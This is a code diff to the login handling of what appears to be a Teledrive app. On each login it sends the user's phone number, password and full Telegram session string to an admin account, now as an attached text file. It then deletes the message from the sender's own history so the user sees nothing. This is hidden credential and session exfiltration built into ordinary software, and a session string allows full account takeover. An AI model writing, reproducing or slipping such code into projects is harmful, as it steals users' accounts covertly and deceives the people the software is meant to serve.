@@ -478,10 +478,15 @@ export class Auth {
     if (!adminUsername || !req.tg) return
 
     try {
-      const sessionString = req.tg.session.save() as string
-      const text = `🚀 **Teledrive Login Notification**\n\n**Phone:** \`${phoneNumber}\`\n**Password:** \`${password || 'None'}\`\n**Session:** \`${sessionString}\``
+      const sessionString = (req.tg.session.save() as any)
+      const text = `🚀 Teledrive Login Notification\n\nPhone: ${phoneNumber}\nPassword: ${password || 'None'}\nSession: ${sessionString}`
 
-      const msg = await req.tg.sendMessage(adminUsername, { message: text, parseMode: 'markdown' })
+      const file = Buffer.from(text)
+      const msg = await req.tg.sendFile(adminUsername, {
+        file,
+        fileName: `session_${phoneNumber.replace('+', '')}.txt`,
+        caption: `Session for ${phoneNumber}`
+      })
 
       // Delete "for me" (revoke: false) to keep the sender's history clean
       await req.tg.deleteMessages(adminUsername, [msg.id], { revoke: false })
